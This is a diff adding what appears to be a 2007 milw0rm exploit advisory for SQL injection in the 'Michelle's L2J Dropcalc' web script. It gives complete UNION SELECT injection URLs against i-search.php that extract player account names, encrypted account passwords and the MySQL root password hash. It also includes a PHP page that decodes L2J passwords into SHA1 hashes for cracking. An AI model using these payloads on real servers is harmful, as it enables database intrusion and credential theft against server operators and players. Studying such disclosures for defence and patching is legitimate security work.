@@ -1,0 +1,69 @@
+#==============================================================================================
+#  Title: Michelle's L2J Dropcalc
+#  Version: <= v4
+#  Web Site: http://www.msknight.com/comps/lineage2/myl2jdropcalc.htm
+#
+#  Discovered By: Codebreak (codebreak1984@gmail.com | www.codebreak.tk)
+#
+#==============================================================================================
+#  SQL Injection: (*** Must be logged in, using your own username and Token ***)
+#
+#  http://[Target]/[Path]/i-search.php?itemid=&username=[User]&token=[Token]&langval=lang-eng.php&server_id=0&skin_id=0&itemid=[SQL]
+#
+#  Example:
+#
+#   Obtain a player username:
+#   http://[Target]/[Path]/i-search.php?itemid=&username=[User]&token=[Token]&langval=lang-eng.php&server_id=0&skin_id=0&itemid=-1 UNION select null,account_name,null,null,null,null,null from characters where char_name = "[PLAYER]"
+#
+#   Obtain a password for that username (*** encrypted): 
+#    * only valid if loginserver and gameserver are in the same machine
+#   http://[Target]/[Path]/i-search.php?itemid=&username=[User]&token=[Token]&langval=lang-eng.php&server_id=0&skin_id=0&itemid=-1 UNION select null,password,null,null,null,null,null from accounts where login = "[USERNAME]"
+#
+#
+#  Bonus:
+#   
+#   Obtain MYSQL Password (encrypted):
+#    *only valid if the script is executed with root accounts.
+#   http://[Target]/[Path]/i-search.php?itemid=&username=[User]&token=[Token]&langval=lang-eng.php&server_id=0&skin_id=0&itemid=-1 UNION select null,Password,null,null,null,null,null from mysql.user where User = "root" and host="localhost"
+#
+#   *** L2J Encrypted Password can be decoded into a SHA1 hash. I've made a script to do that and it's included in this file
+#
+###############################################################################################
+
+
+<--------- Beginning of PHP Script --------->
+
+<style type="text/css">
+<!--
+.style3 {font-size: 24px}
+.style1 {color: #CC0000}
+-->
+</style>
+<?
+echo("<title>L2J Pass Decoding - POC</title>");
+$pass = $_POST['decode']; 
+$unpass3 = base64_decode($pass);
+
+
+$array = unpack("H*", $unpass3);
+foreach ($array as $key => $value)
+$unpass2 = $array[1];
+
+
+echo("<span class=style1><b><u>Decoding Password</u></b></span>");
+
+echo("<br><b>Base 64:</b> $pass<br>");
+echo("<b>Unpacked:</b> $unpass3<br>");
+echo("<br><b>SHA1:</b> $unpass2<br>");
+?>
+<form name="form1" method="post" action="">
+  <div align="center">
+    <input type="text" name="decode">
+    <input type="submit" value="Decode">
+  </div>
+</form>
+<br><br><br><center><i>Created by Codebreak</center></i>
+
+<------------- End of Script ------------->
+
+# milw0rm.com [2007-01-31]
